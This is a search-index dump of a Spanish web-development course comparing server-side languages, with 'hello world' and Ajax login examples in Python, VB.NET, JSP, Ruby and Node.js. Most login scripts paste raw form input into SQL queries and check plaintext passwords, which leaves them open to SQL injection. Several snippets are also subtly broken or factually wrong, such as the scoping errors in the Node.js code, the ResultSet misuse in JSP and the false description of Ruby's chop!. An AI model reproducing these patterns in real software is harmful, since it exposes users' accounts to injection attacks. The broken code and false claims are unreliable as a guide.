mundo&lt;/h1&gt;\" print \"&lt;/body&gt;&lt;/html&gt;\" . 8.3.7. Ejemplo 2 en Python: login con comprobación de email por Ajax . Repetimos ahora el ejemplo del login con comprobación de usuario y contraseña mediante Ajax, pero no mostraremos de nuevo el código del formulario ni de la llamada Ajax. Para ver ese código, revisa la sección que dedicamos al lenguaje Perl. Allí solo tendrás que cambiar el nombre del script (login.pl) por login.py. El código de ese script sí que cambia, claro. Esta es la versión del mismo escrita en Python: . #!/usr/bin/python import cgi import MySQLdb # Capturamos los valores del formulario form = cgi.FieldStorage() usuario = form[\"username\"].value; password = form[\"password\"].value; print \"Usuario = \", usuario, \" Pass = \", password # Lanzamos la consulta contra la base de datos db=MySQLdb.connect(host='localhost', user='yo-que-sé', passwd='vete-a-saber', db='lo-que-sea') cursor=db.cursor() num_rows = cursor.execute(\"SELECT id FROM users WHERE username = '%s' AND password = '%s';\", (usuario, password)) userid = cursor.fetchone() # Devolvemos el resultado en JSON print \"Content-type: application/json\\n\" if num_rows == 0: print \"{'error': 'Usuario o contraseña incorrectos'}\" else: print \"{'success': 'El usuario y la contraseña son válidos', 'userid': '%d'\", userid . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/python.html#83-python",
    "relUrl": "/otros/python.html#83-python"
  },"100": {
    "doc": "8.3 Python",
    "title": "8.3 Python",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/python.html",
    "relUrl": "/otros/python.html"
  },"101": {
    "doc": "8.4 .NET",
    "title": "8.4. .NET",
    "content": "8.4.1. Características de .NET . Fecha de aparición: 1996 (ASP) / 2002 (.NET) . Perspectivas: . | .NET es la alternativa de Microsoft a JSP para desarrollo de grandes proyectos, donde PHP, Python o Ruby se quedan (o eso dicen desde Microsoft) pequeños. | .NET no es un lenguaje de programación, sino el conjunto de toda la tecnología de servidor de Microsoft para desarrollar aplicaciones web. Esa tecnología se puede usar con varios lenguajes. Los más habituales con Visual Basic .NET (conocido como VB.NET) y C#. | Tiene componentes exclusivos en el servidor y altas prestaciones. | Su coste es más elevado. | Hay que sufrir los problemas de seguridad endémicos a los productos Microsoft. | . Filosofía: . | Framework de código cerrado y propietario. | Tecnología multilenguaje. Suele correr con VB.NET o C#. | Puede funcionar como PHP, embebido dentro de HTML. | Incluye controles de servidor exclusivos de Microsoft (equivalentes a los ActiveX del lado del cliente) | . 8.4.2. Configuración necesaria en el servidor . Para hacer funcionar una aplicación .NET es necesario tener un servidor con sistema operativo Windows Server, que tiene integrado Microsoft IIS (Internet Information Server). También puede ejecutarse con un módulo de apache (llamado mono), pero es mucho más lento. Cada solución requiere su propio servidor. Si quieres PHP, Python o Ruby, usa Apache. Si quieres JSP, usa Tomcat. Si quieres ASP, usa IIS. Así te evitarás problemas. 8.4.3. Sintaxis básica de .NET con VB.NET . El código VB.NET (como el de C#) se puede embeber en HTML de este modo: . &lt;html&gt; &lt;head&gt;...&lt;/head&gt; &lt;body&gt; Este texto se ha generado desde HTML&lt;br/&gt; &lt;% response.write(\"Y este se ha generado con ASP\") %&gt; &lt;/body &lt;/html&gt; . No es necesario declarar las variables de tipo simple, pero puede hacerse: . Dim i,j,k As Integer . Los operadores son los habituales, excepto el de asignación, que se escribe con un solo igual. Las posibles ambigüedades con el operador de comparación se resuelven por el contexto: . | Operadores de comparación: &lt;, &gt;, &lt;=, &gt;=, =, &lt;&gt; | Operadores de asignación: = | . Y estas son algunas estructuras de control: . Do While (condicion) Acciones Loop For variable As Integer = 1 To 5 Acciones Next If (condicion) Then Acciones-1 Else Acciones-2 End If . 8.4.4. Entrada / Salida . Para leer los datos procedentes de un formulario debemos recurrir al objeto predefinido request: . // Leer datos de un formulario (GET): variable = request.QueryString(\"campo\"); // Leer datos de un formulario (POST): variable = request.Form(\"campo\"); . La salida de datos se hace con response.write(): . response.write (\"cadena\" + variable + \"cadena2\"); . 8.4.5. Bibliotecas, funciones y clases . Con VB.NET (o C#) se pueden crear bibliotecas de clases de forma visual desde el propio entorno de programación de .NET. Las clases en VB.NET se definen de forma muy parecida a Java o PHP: . class MiClase Inherits ClaseMadre Dim int UnAtributo; Dim bool OtroAtributo; Function MiMetodo(parametros) As tipo // Aquí va el código del método return valor; End Function End Class . Para utilizar una librería (estándar o de terceros) se utiliza la directiva @Import: . @Import Namespace=\"Biblioteca\" . Por último, se pueden definir subrutinas independientes (funciones o métodos) con esta sintaxis: . Sub NombreMétodo(parametros) Acciones; End Sub . 8.4.6. Ejemplo 1 en VBasic: Hola mundo . &lt;% response.write(\"&lt;html&gt;&lt;body&gt;\") response.write(\"&lt;h1&gt;Hola, mundo&lt;/h1&gt;\") response.write(\"&lt;/body&gt;&lt;/html&gt;\") %&gt; . 8.4.7. Ejemplo 2 en VBasic: login con comprobación de email por Ajax . Como antes, no mostraremos el código del lado del cliente (formulario + solicitud Ajax). Si quieres repasar ese código, lo encontrarás en la sección correspondiente al lenguaje Perl. Lo que sí encontrarás aquí es el código de login.asp, el script escrito en VB.NET que realiza la consulta a la base de datos para comprobar si el login es correcto y devuelve el resultado formateado en JSON. &lt;% # Conectamos con la BD strDSN= \"DRIVER={MySQL ODBC 3.51 driver}; Server=localhost; Database=prueba; User=root; Password=xxxx\" con = Server.CreateObject(\"ADODB.Connection\") con.Open strDSN # recuperamos la información del formulario name = request.Form(\"username\"); pass = request.Form(\"password\"); # lanzamos la consulta contra la bas de datos rs = con.Execute(\"SELECT id FROM users WHERE user = '\" + name + \"' AND password = '\" + pass + \"'\"); # generamos la salida JSON If (rs.eof) Then Response.Write \"{'error': 'Usuario o contraseña incorrectos'}\" Else Response.Write \"{'success': 'Login OK', 'userid': \"+ rs(\"id\") + \"}\"); End If con.close %&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/punto-net.html#84-net",
    "relUrl": "/otros/punto-net.html#84-net"
  },"102": {
    "doc": "8.4 .NET",
    "title": "8.4 .NET",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/punto-net.html",
    "relUrl": "/otros/punto-net.html"
  },"103": {
    "doc": "8.5 JSP",
    "title": "8.5. JSP",
    "content": "8.5.1. Características del lenguaje JSP . Fecha de aparición: 1995 . Perspectivas: . | Usado para proyectos grandes y complejos, donde PHP (y otros lenguajes de scripting) se quedan pequeños. O eso aseguran los chicos de Oracle, claro. | El lenguaje de programación es Java, es decir, lo conoce cualquier programador. | Velocidad de ejecución superior a la de otros lenguajes semi-interpretados. | . Filosofía: . | Adaptación natural de Java al lado del servidor. | Orientado a objetos. Multiplataforma. Fuertemente tipado. | Puede embeberse dentro de HTML, como PHP. | El código Java se precompila en un Servlet y se deja cargado en la memoria del servidor. Las peticiones subsiguientes se ejecutan así de forma más rápida. Este enfoque está siendo adoptado por otras tecnologías del lado del servidor, como NodeJS o algunos frameworks basados en otros lenguajes, que precompilan las vistas para servirlas mucho más deprisa. | . 8.5.2. Configuración necesaria en el servidor . Para ejecutar Java en el lado del servidor, lo más apropiado es instalar Tomcat. Es el servidor de referencia para la tecnología JSP. Apache Tomcat es un servidor web capaz de contener y servir los servlets de Java. Implementa todos los servicios necesarios para que JSP funcione correctamente. Existen otros servidores, como JBoss o Embarcadero, pero Tomcat continúa siendo el más extendido en la actualidad. Como se ejecuta sobre la máquina virtual de Java, es posible hacerlo funcionar en cualquier sistema operativo. Otras soluciones, como ejecutar JSP a través de CGI en un servidor web convencional, son técnicamente viables pero resultan mucho más lentas. 8.5.3. Sintaxis básica de JSP . El código JSP se embebe en HTML de este modo: . &lt;html&gt; &lt;head&gt;...&lt;/head&gt; &lt;body&gt; Este texto se ha generado desde HTML&lt;br/&gt; &lt;% out.println(\"Y este se ha generado con JSP\"); %&gt; &lt;/body&gt; &lt;/html&gt; . Las variables se declaran como en cualquier programa Java. Por ejemplo: . int var = 5; out.print(\"La variable var vale \" + var); . Estos son los operadores más habituales: . Comparación: &lt;, &gt;, &lt;=, &gt;=, ==, != Asignación: = . Y estas son algunas estructuras de control: . while (condicion) { Acciones; } if (condicion) { Acciones-1; } else { Acciones-2; } . 8.5.4. Entrada / Salida . La entrada de datos a través de un formulario HTML se hace usando el objeto request, que estará precargado en cualquier Servlet. La salida se puede hacer con un simple System.out.println(): . // Leer datos de un formulario: variable = request.getParameter(\"campo\"); // Salida: System.out.println (\"cadena\" + variable + \"cadena2\"); . 8.5.5. Bibliotecas, clases y métodos . La forma de escribir clases y métodos en JSP es la misma que en Java, como es lógico. No vamos a explicar aquí todas las peculiaridades del lenguaje, que son muchas y pintorescas. Solo recordaremos que, en Java, no pueden existir métodos fuera de las clases, porque es un lenguaje orientado a objetos bastante estricto. La sintaxis para declarar una clase, sus atributos y sus métodos es esta: . class MiClase extends ClaseMadre { public|private|protected tipo atributo; public|private|protected tipo nombre(params) { Acciones; } } . Cada clase debe ir en un archivo independiente con el mismo nombre que la clase que contiene. Las clases de Java pueden agruparse en paquetes (packages). La forma de importar un paquete para usar sus clases en nuestro programa es: . import paquete; // Esto importa el paquete completo import paquete.clase; // Esto importa solo una clase del paquete . Pero cuidado, cuando se trabaja con JSP existe una pequeña diferencia en la forma de importar paquetes: en lugar de la sentencia import, se debe emplear una directiva del precompilador. Las directivas son instrucciones para el precompilador de Java que modifican su modo de proceder durante la compilación. Todas las directivas empiezan por el símbolo “@”. En el caso concreto de la importación de paquetes o clases en un script JSP, la directiva que debemos emplear es: . &lt;%@ page import=\"paquete\" %&gt; . 8.5.6. Ejemplo 1 en JSP: Hola mundo . &lt;% out.println(“&lt;html&gt;&lt;body&gt;”); out.println(“&lt;h1&gt;Hola, mundo&lt;/h1&gt;”); out.println(“&lt;/body&gt;&lt;/html&gt;”); %&gt; . 8.5.7. Ejemplo 2 en JSP: login con comprobación de email por Ajax . Nuevamente, mostraremos solo el script del lado del sevidor (login.jsp). El código del lado del cliente lo tienes disponible en la sección que dedicamos al lenguaje Perl, donde solo tendrás que cambiar la referencia a “login.pl” por “login.jsp”. &lt;% @page import=\"java.sql.*\" # Conectamos a la BD Connection conex = null; Statement st = null; Class.forName(\"org.gjt.mm.mysql.Driver\"); conex = DriverManager.getConnection(\"jdbc:mysql://servidor\", \"user\", \"pass\"); # Recuperamos la información del formulario name = request.getParameter(\"username\"); pass = request.getParameter(\"password\"); # Consultamos usuario y contraseña en la base de datos st = conex.createStatement(); ResultSet = st.executeQuery(\"SELECT id FROM users WHERE user = '\" + name + \"' AND password = '\" + pass + \"'\"); # Generamos la respuesta JSON para el cliente if (st.EOF) out.println(\"{'error': 'Usuario o contraseña incorrectos'}\"); else out.println(\"{'success': 'Autenticación correcta', 'userid':\"+ ResultSet.getInt() + \"}\"); conex.close() %&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/jsp.html#85-jsp",
    "relUrl": "/otros/jsp.html#85-jsp"
  },"104": {
    "doc": "8.5 JSP",
    "title": "8.5 JSP",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/jsp.html",
    "relUrl": "/otros/jsp.html"
  },"105": {
    "doc": "8.6 Ruby",
    "title": "8.6. Ruby",
    "content": "8.6.1. Características del lenguaje Ruby . Fecha de aparición: 1995 . Perspectivas: . | Uso y popularidad creciente. | Base de programadores fiel y especializada. | Excelente relación señal/ruido. | Aún tiene algunos problemas por resolver: El lenguaje todavía está en fase de importantes cambios, tiene peor rendimiento que Python o PHP y muchos módulos (gemas) están mal documentados. | . Filosofía: . | Completa –y verdaderamente– orientado a objetos. Todo es un objeto. | Admite otros paradigmas ocultos bajo los objetos. | “Rápido y fácil”. Es un lenguaje divertido: de programadores para programadores. | Curva de aprendizaje larga pero nunca abrupta. | Potente sistema de expresiones regulares. | En combinación con Rails, ideal para desarrollo web MVC rápido y basado en prototipos. | . ¿Y Ruby on Rails? . Rails, también conocido como Ruby-on-rails, es un framework para desarrollar aplicaciones web MVC con Ruby. Apareció en 2004 y gustó tanto que otros frameworks para otros lenguajes (como Laravel para PHP) se han inspirado en su forma de trabajar: abundantes capas de abstracción para evitar tareas de bajo nivel, scaffolding, integración con Ajax, Convention over Configuration (CoC) y Don’t Repeat Yourself (DRY). Rails se hizo tan famoso que mucha gente, aún hoy en día, confunde el lenguaje (Ruby) con el framework (Ruby on Rails). 8.6.2. Configuración necesaria en el servidor . Para poder ejecutar scripts en Ruby en un servidor web Apache o similar, necesitarás: . | Instalar el intérprete Ruby en el sistema. | Instalar el módulo de Ruby (mod_ruby) y/o el módulo cgi (mod_cgi) para Apache. | Configurar el manejador de Apache para CGI. | Instalar módulos adicionales para Ruby (como cgi o mysql) si son necesarios. | . Como en el caso de Perl o Python, Ruby puede correr de forma nativa en Apache (más rápido pero menos frecuente) o como script CGI. 8.6.3. Sintaxis básica de Ruby . En Ruby, no es necesario declarar las variables. El tipado es dinámico (tipo duck: si anda como un pato y parece un pato, es que es un pato). Todo es un objeto en este lenguaje, incluso números enteros o los valores constantes, lo cual conduce a expresiones chocantes como estas: . 5.isEven? \"cadena\".lenght variable_cadena.chop! . Ruby está lleno de convenciones para evitar tener que llenar la documentación de explicaciones innecesarias (a esto se le llama “filosofía CoC” = Convention over Configuracion). Por ejemplo: . | Es una convención que todos los métodos cuyo nombre termine en una interrogación, deben devolver un booleano. En el ejemplo anterior, el método isEven es uno de ellos. | Otra convención es que todos los métodos cuyo nombre termine en una admiración, modificarán irreversiblemente el objeto con el que se invocan. En el ejemplo anterior, el método chop! troceará la cadena cada vez que encuentre un espacio en blanco en su interior, convirtiéndola en un array de cadenas. | . Los operadores de Ruby son los habituales: . Comparación: ==, &lt;, &gt;, &lt;=, &gt;=, =, != Asignación: = . Las estructuras de control también te resultarán familiares. No se utilizan llaves ({…}) para marcar los bloques, sino que cada bloque finaliza con la palabra end. El sangrado es optativo pero, por supuesto, muy recomendable. while condicion Acciones end if condicion Acciones-1 else Acciones-2 end . Sin embargo, el uso de bucles clásicos casi siempre puede sustituirse por iteradores sobre objetos, algo cada vez más frecuente en los lenguajes orientados a objetos: . variable_array.do_each ... end num_rows.times do ... end . 8.6.4. Entrada / Salida . La entrada de datos a través de un formulario HTML se hace usando un objeto de la clase CGI. La salida, con una sencilla sentencia print: . // Leer datos de un formulario require \"cgi\" cgi = CGI.new variable = cgi[\"campo\"]; // Salida de datos print \"cadena\", variable, \"cadena2\", ... 8.6.5. Bibliotecas, clases y métodos . Las clases en Ruby se declaran de forma muy semejante a Python (observa cómo el símbolo “&lt;” indica herencia): . class nombre_clase &lt; clase-madre def nombre(parametros) Acciones; end end . Las clases se pueden agrupar en módulos llamados “gemas” (gems). Una gema se puede incluir en nuestro código así: . include \"nombre_gema\" . 8.6.6. Ejemplo 1 en Ruby: Hola mundo . #!/usr/bin/ruby print \"Content-Type: text/html\\n\\n\" print \"&lt;html&gt;&lt;body&gt;\" print \"&lt;h1&gt;Hola, mundo&lt;/h1&gt;\" print \"&lt;/body&gt;&lt;/html&gt;\" . 8.6.7. Ejemplo 2 en Ruby: login con comprobación de email por Ajax . Una vez más, solo mostraremos el script del lado del servidor (login.rb). Para revisar el código del lado del cliente, puedes acudir a la sección dedicada al lenguaje Perl, y sustituir la referencia al script login.pl por login.rb. El resto del código permanecerá idéntico. #!/usr/bin/ruby require \"mysql\" require \"cgi\" begin # Conexión con la base de datos con = Mysql.new 'server', 'db-user', 'db-password', 'db-name' # Recuperamos la información del formulario HTML cgi = CGI.new name = cgi[\"username\"] pass = cgi[\"password\"] # Consultamos la base de datos res = con.query(\"SELECT id FROM users WHERE user = '#{name}' AND password = '#{pass}'\") # Generamos la salida JSON para el cliente print \"Content-type: application/json\\n\\n\" if res.num_rows == 0 print %Q!{\"error\": \"Username or password not valid\"}! else row = res.fetch_hash print %Q!{\"success\": \"Authentication is OK\", \"userid\": \"#{row['id']}\" }! end con.close if con end . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/ruby.html#86-ruby",
    "relUrl": "/otros/ruby.html#86-ruby"
  },"106": {
    "doc": "8.6 Ruby",
    "title": "8.6 Ruby",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/ruby.html",
    "relUrl": "/otros/ruby.html"
  },"107": {
    "doc": "8.7 Node.js",
    "title": "8.7. Node.js",
    "content": "Node.js no es un lenguaje de programación, sino un entorno de ejecución en el lado del servidor (aunque puede funcionar en otros entornos) basado en el lenguaje Javascript. Por lo tanto, al contrario que el código Javascript convencional, Node.js ejecuta Javascript en el servidor. De este modo, pueden unificarse los lenguajes del lado del cliente y del servidor. Esa es una de las razones que explica el rápido crecimiento que Node.js está experimentando en los últimos años. Como es lógico, en Node.js se omiten todas las referencias a la API del navegador web y, como es lógico también, se añade soporte para las APIs del sistema operativo u otros subsistemas típicos que se encuentran en los servidores. Por ejemplo, con Node.js tenemos acceso a bases de datos o al sistema de ficheros del servidor. Vamos a ver una introducción muy breve a Node.js. Ten en cuenta que, además, Node.js no suele usarse de forma independiente para desarrollar aplicaciones web, sino en conjunción con algún framework como Express. De hecho, es rara la aplicación web que se programa sin Express en la actualidad. 8.7.1. Características del lenguaje Node.js . Fecha de aparición: 2009 . Perspectivas: . | Uso y popularidad creciente. | Posibilidad de convertirse en un estándar de desarrollo web fullstack. | Buena relación señal/ruido. | Node.js tiene problemas que resolver si quiere imponerse como estándar: la API cambia continuamente y no es compatible hacia atrás, la librería estándar de Javascript es minúscula comparada con otros lenguajes y las librerías de terceros son a veces poco probadas, cambiantes o directamente inexistentes para hacer ciertas cosas que en otras plataformas se dan por supuestas. | . Filosofía: . | Usa el motor de JavaScript V8 de Chrome fuera del navegador para ejecutarse en el servidor. | Las operaciones de E/S son sin bloqueo, esto es, asíncronas. | El fluje de ejecución no es lineal, sino dirigido por eventos, como ocurre casi siempre en las aplicaciones web. Esto mejora el rendimiento, porque el programa está casi todo el tiempo ocioso, a la espera de que ocurra algún evento. | Tiene acceso nativo a bases de datos documentales como MongoDB. Hablaremos un poco más sobre qué significa esto más adelante. | Las aplicaciones altamente escalables. | Simplicidad y modularidad. | Gestor npm para librerías de terceros. | . 8.7.2. Configuración necesaria en el servidor . Node.js incluye su propio servidor web. Recuerda que Node.js no es un lenguaje de programación, sino una plataforma de desarrollo en el lado del servidor completa. Así que, para lanzar un servidor web con Node.js, lo único que debemos instalar en el servidor es el propio Node.js. Una vez hecho esto, podemos crear un servidor HTTP básico creando un programa Javascript como este: . var http = require('http'); http.createServer(function (peticion, respuesta) // Aquí se escribe la respuesta del servidor ).listen(9000, '127.0.0.1'); // Puerto e IP donde escuchará el servidor . Luego bastará con ejecutar este programa en el servidor desde una consola de comandos: . $ node nombre-del-archivo.js . 8.7.3. Sintaxis básica de Node.js . El lenguaje de programación que usa Node.js es Javascript, así que hay poco que decir sobre la sintaxis de las estructuras de control, las asignaciones o los operadores, puesto que ya la conoces. 8.7.4. Entrada / Salida con Node.js . La entrada y salida en un entorno Node.js es lo que más se diferencia del Javascript que manejas habitualmente, puesto que ahora estamos trabajando en un servidor, no en un navegador web. La salida mediante console.log() puede seguir usándose, pero no es lo habitual en aplicaciones web, puesto que esa salida se producirá en la consola de texto del servidor. Para la entrada, existe la función openStdin(), que crea un objeto sobre el que se puede agregar un evento de entrada de datos, como en este ejemplo: . console.log(\"Escribe tu nombre\"); var stdin = process.openStdin(); stdin.addListener(\"data\", function(entradaPorTeclado) { console.log(\"Tu nombre es: \" + entradaPorTeclado.toString()); }); . Aquí se puede ver qué significa que Node.js sea un entorno de ejecución dirigido por eventos: en lugar de lanzar la lectura por teclado y dejar al programa esperando hasta que esa lectura por teclado se produzca, lo que hacemos es asignar un manejador de evento o listener que se ejecutará cuando ocurra cierto evento asociado. En este ejemplo, asociamos un listener al objeto stdin. Cuando ocurra el evento (en este caso, el evento se llama “data”, que significa “recepción de datos” en el objeto stdin), se ejecutará el código de la función. Mientras tanto, el programa continuará con su ejecución normal, atendiendo a cualquier otro evento que pudiera producirse y que esté programado para atender. Sin embargo, en una aplicación web, raramente se hace la entrada y salida por consola, ¿verdad? La entrada debería hacerse desde un formulario web, mientras que la salida debería ser una respuesta HTTP. Te muestro cómo se hace esto con Node.js con otro ejemplo: . var http = require('http'); var datos_del_post; http.createServer(function(peticion, respuesta) { if(peticion.method == 'POST'){ var datos_del_post = ''; peticion.on('data', function(trozo_de_datos){ datos_del_post += trozo_de_datos; }); peticion.on('end', function(){ datos_del_post = querystring.parse(datos_del_post); respuesta.writeHead(200, {'Content-Type': 'text/html'}); respuesta.write(\"He recibido correctamente el formulario\"); respuesta.write(\"Estos son los datos que me han llegado:\"); respuesta.write(\"Nombre: \" + datos_del_post.name + \". Email = \" + datos_del_post.email); frespuesta.end(); }); }else{ respuesta.writeHead(200, {'Content-Type': 'text/html'}); respuesta.end(\"No he ha llegado ningún dato por POST\"); } }).listen(9000, '127.0.0.1'); . Si observas este código, verás que tiene la misma estructura que el que vimos en el apartado “Configuración necesaria en el servidor”, solo que hemos rellenado la función principal con más cosas. Esa función tiene dos argumentos, petición y respuesta: . | En petición, el servidor coloca todos los datos de la petición que proviene del cliente. La información del formulario estará aquí, por lo tanto. | En respuesta, el servidor colocará todos los datos de la respuesta HTTP que va a enviar al cliente. | . Fíjate cómo en el código, en primer lugar, miramos si la petición del cliente nos llegó por POST. Si es así, creamos dos manejadores de eventos: . | El manejador “data” se ejecutará cuando llegue un nuevo fragmento de información por POST. | El manejador “end” se ejecutará cuando haya terminado de recibirse información desde el cliente. | . Por eso, en el manejador “data” nos limitamos a ir encadenando los datos que llegan por POST en la variable datos_del_post, y es en el manejador “end” cuando los procesamos. Observa cómo en ese manejador generamos la respuesta HTTP mediante el método write(). La respuesta se envía al cliente cuando se ejecuta el método end(). 8.7.5. Módulos de Node.js . Las bibliotecas o módulos, como se llaman en Node.js, son una parte crucial de este entorno de desarollo. Los módulos, como en cualquier lenguaje, permiten reutilizar código, pero gracias a npm (Node Package Manager), puedes insertar tus librerías dentro de otras, o bien publicarlas para ponerlas al servicio de la comunidad. Y, por supuesto, usar las librerías de otros para tus proyectos. Require . Para utilizar un módulo, se usa require. Por ejemplo, un módulo de la librería estándar de Node.js se llama “fs” y sirve para manipular ficheros. Si lo necesitamos en nuestro programa, basta con escribir esto: . const fs = require('fs'); fs.readFile('./file.txt', 'utf-8', (err, data) =&gt; { if(err) { throw err; } console.log('data: ', data); }); . En este ejemplo, hemos importado el módulo “fs” y lo hemos asignado a una variable. A partir de esa variable, podemos usar cualquier método del módulo, como readFile(). La lista de funciones disponibles, como es lógico, tendrás que consultarla en la documentación del módulo. require buscará los módulos en este orden: . | Módulos de la librería estándar de Node.js | Módulos importados con npm | Módulos locales, es decir, que hayamos descargado y almacenado manualmente en el directorio de trabajo. | . Librería estándar de Node.js . Con solo instalar Node.js en el sistema, ya dispones de todos los módulos de la librería estándar. Algunos de los módulos más utilizados con aplicaciones web son: . | fs: Para manipular ficheros. | path: Para trabajar con directorios. | http: Para crear servidores y clientes. | url: Para analizar URLs y extraer segmentos y variables de ellas. | . Módulos instalados con npm . Los módulos instalados con npm están desarrollados por terceros, es decir, no forman parte del core de Node.js. Exiten literalmente miles de módulos que puedes instalar con npm, ya que cualquier desarrollador puede publicar el suyo. Asegúrate de consultar la web del desarrollador (y, sobre todo, la página de documentación) antes de instalar un módulo. Algunos ejmplos de módulos npm que podrían ser útiles en una aplicación web son: . | lodash: Para manipular arrays, objetos, colecciones, cadenas… | request: Un servidor http más simple de usar que el módulo estándar que viene con Node.js. | gm: Permite manipular imágenes en el servidor: rotación, recorte, redimensionamiento, etc. | pdfkit: Para importar y exportar documentos PDF. | express: Un framework completo (aunque minimalista) para trabajar con Node, con soporte para middlewares, renderizadores de vistas y mucho más. | restify: Para crear servidores REST de forma aún más minimalista que con express. | . Para instalar un módulo mediante npm, basta con teclear esto en un terminal: . $ npm install pdfkit . Después, en nuestro código fuente, podemos usar ese módulo así: . const pdfkit = require('pdfkit'); . 8.7.6. Node.js y MongoDB . MongoDB es un gestor de bases de datos no relacional (o no-SQL) con una implantación creciente en el mercado profesional. Se dice que MongoDB está orientado a documentos. Los documentos en estas bases de datos son el equivalente a los registros de las bases de datos relacionales, pero menos rígidos. Un documento puede contener literalmente cualquier cosa, siempre que esté formateada del modo adecuado para la base de datos (lo que significa, generalmente, que esté escrito en correcto XML o JSON). Las bases de datos documentales son capaces de bucear en esos documentos, crear nuevos documentos, modificarlos y borrarlos, indexarlos y, como es lógico, realizar búsquedas. MongoDB agrupa los documentos en colecciones, de modo que si un documento es algo parecido a un registro (pero más flexible), una colección es algo parecido a una tabla (también más flexible). No existe el concepto de campo, dominio, ni nada parecido: cada documento de la colección puede tener su propia estructura. MongoDB y Node.js se han llevado muy bien desde siempre, hasta el punto de que parte del éxito actual de uno se debe al éxito del otro, y viceversa. No es nuestra intención (ni tenemos espacio aquí) adentrarnos en los vericuetos de las bases de datos documentales, sino presentártelas para que conozcas su existencia. Si pretendes dedicarte al desarrollo web profesionalmente, es muy posible que, antes o después, te encuentres con bases de datos no-SQL como MongoDB. 8.7.7. Ejemplo 1 en Node.js: Hola mundo . var http = require('http'); http.createServer(function (req, res) // Cabecera http. No es imprescindible, pero sí recomendable. // Recuerda que el código 200 significa \"OK\" en el protocolo http/https. // El 'Content-type' más habitual es 'text/html' o 'application/json'. res.writeHead(200, 'Content-Type': 'text/html'); res.write('Hola, mundo!'); res.end(); ).listen(9000); // Puerto donde el servidor escuchará . 8.7.8. Ejemplo 2 en Node.js: login con comprobación de email por Ajax . Como en las ocasiones anteriores, solo mostramos aquí el script del lado del servidor (login.js). Para revisar el código del lado del cliente, puedes acudir a la sección dedicada al lenguaje Perl, y sustituir la referencia al script login.pl por login.js. El resto del código permanecerá idéntico. Hay que destacar que, con el uso de Express, la implementación de esta respuesta del servidor se simplificaría bastante. No lo tomes, por lo tanto, como un ejemplo realista, sino como una muestra el aspecto que tiene el código fuente de Node.js. Observa que, al tratarse de un código dirigido por eventos, no escribimos el algoritmo de arriba a abajo, en el orden en el que se deben ejecutar las cosas, sino que vamos respondiendo a estos eventos: . | Recepción de datos por GET. | Finalización de la recepción de datos por GET. | Conexión lista con la base de datos. | . Curiosamente, la consulta a la base de datos no lanza un evento cuando está lista, sino que la función manejadora se indica justo a continuación de la consulta. Esta función se ejecutará cuando la consulta finalice y la base de datos devuelva los resultados. var mysql = require('mysql'); var http = require('http'); var GETdata, dbconnection; http.createServer(function(peticion, respuesta) { if(peticion.method == 'GET'){ var GETdata = ''; peticion.on('data', function(data) { // Vamos recogiendo los datos que llegan por GET GETdata += data; }); peticion.on('end', function(){ // Ha finalizado la llegada de datos. Preparamos la conexión con la BD. GETdata = querystring.parse(GETdata); var dbconnection = mysql.createConnection({host: \"localhost\", user: \"nombre-usuario\", password: \"contraseña\", database: \"nombre-base-de-datos\"}); }); } dbconnection.connect(function(err) { // La conexión con la BD ya está lista if (err) throw err; // Lanzamos la consulta y procesamos la respuesta dbconnection.query(`SELECT * FROM users WHERE username = '${GETdata.username}' AND password = '${GETdata.password}'`, function (err, result, fields) { if (err) throw err; respuesta.writeHead(200, {'Content-Type': 'application/json'}); if (result.length == 0) { respuesta.write(JSON.stringify({\"error\": \"Username or password not valid\"})); } else { respuesta.write(JSON.stringify({\"success\": \"Authentication OK\", \"userid\": result[0].id})); } respuesta.end(); }); }); }).listen(9000, '127.0.0.1'); . ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/nodejs.html#87-nodejs",
    "relUrl": "/otros/nodejs.html#87-nodejs"
  },"108": {
    "doc": "8.7 Node.js",
    "title": "8.7 Node.js",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/nodejs.html",
    "relUrl": "/otros/nodejs.html"
  },"109": {
    "doc": "8.8 Más tecnologías aún",
    "title": "8.8. Y otras tecnologías aún más extrañas",
    "content": "Además de los lenguajes que hemos visto, existen otras alternativas a PHP para desarrollar aplicaciones web en el lado del servidor. A continuación mostramos una lista con alguna de estas alternativas (no están todas las que son, pero sí son todas las que están) para quien quiera profundizar aún más en el asunto: . 8.2.1. ColdFusion . ColdFusion es la alternativa en el lado del servidor de Adobe. Es al mismo tiempo un servidor de aplicaciones y un lenguaje de programación. Utiliza elementos &lt;…&gt; para insertar su código en la página web y, lógicamente, interacciona de manera óptima con otros productos de Adobe. Los archivos tienen extensión .cfm. Se diseñó para tener un rendimiento muy elevado (por ejemplo, aprovecha bien la presencia de múltiples procesadores en el servidor). Su implantación siempre ha sido bastante minoritaria. 8.2.2. WebDNA . WebDNA es un lenguaje especialmente diseñado para hacer scripting del lado del servidor (no como PHP, Perl, Python o Ruby, que fueron pensados para otros propósitos). Especialmente rápido en la interacción con bases de datos. Utiliza etiquetas encerradas entre corchetes […] para intercalar su código con HTML. A pesar de sus notables características, nunca ha gozado de demasiado éxito. 8.2.3. Erlang . Se trata de un lenguaje para desarrollo de aplicaciones concurrentes (es decir, en las que varios procesos se ejecutan simultáneamente, cooperando en la resolución de un problema). Fue diseñado para sistemas en tiempo real, y se utiliza a veces en el lado del servidor cuando las aplicaciones tienen necesidades de procesamiento muy elevadas. 8.2.4. Otros SSJS (Server Side JavaScript) . Node.js no inauguró la moda de utilizar Javascript en el lado del servidor: solo ha tenido más éxito que otros. Hace mucho tiempo que se juguetea con la idea de programar scripts del lado del servidor en JavaScript, por lo que existen otras soluciones como JSSP, un proyecto opensource que de momento no ha tenido demasiado éxito, o Wakanda, basado parcialmente en Node y que incluye de forma nativa más cosas, como su propio gestor de bases de datos relacionales o soporte para frameworks en el cliente (Angular, por ejemplo). ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/mas-tecnologias-aun.html#88-y-otras-tecnolog%C3%ADas-a%C3%BAn-m%C3%A1s-extra%C3%B1as",
    "relUrl": "/otros/mas-tecnologias-aun.html#88-y-otras-tecnologías-aún-más-extrañas"
